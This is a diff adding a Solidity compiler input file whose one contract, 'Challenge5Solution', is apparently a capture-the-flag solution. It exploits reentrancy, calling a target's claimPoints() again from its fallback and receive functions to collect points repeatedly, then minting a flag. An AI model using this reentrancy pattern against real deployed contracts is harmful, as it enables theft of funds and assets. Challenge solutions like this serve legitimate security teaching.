@@ -1,0 +1,36 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/Challenge5Solution.sol": {
+      "content": "//SPDX-License-Identifier: MIT\npragma solidity >=0.8.0 <0.9.0;\n\ninterface IChallenge5 {\n    function claimPoints() external;\n\n    function mintFlag() external;\n}\n\ncontract Challenge5Solution {\n    address public target;\n    bool private inClaim;\n    uint256 public remaining;\n\n    constructor(address _target) {\n        target = _target;\n    }\n\n    function attack() external {\n        require(!inClaim, \"busy\");\n        inClaim = true;\n        remaining = 10;\n        IChallenge5(target).claimPoints();\n        inClaim = false;\n        IChallenge5(target).mintFlag();\n    }\n\n    function _reenter() internal {\n        // reenter until remaining points reached\n        if (inClaim && remaining > 1) {\n            remaining -= 1;\n            IChallenge5(target).claimPoints();\n        }\n    }\n\n    fallback() external payable {\n        _reenter();\n    }\n\n    receive() external payable {\n        _reenter();\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "evmVersion": "paris",
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
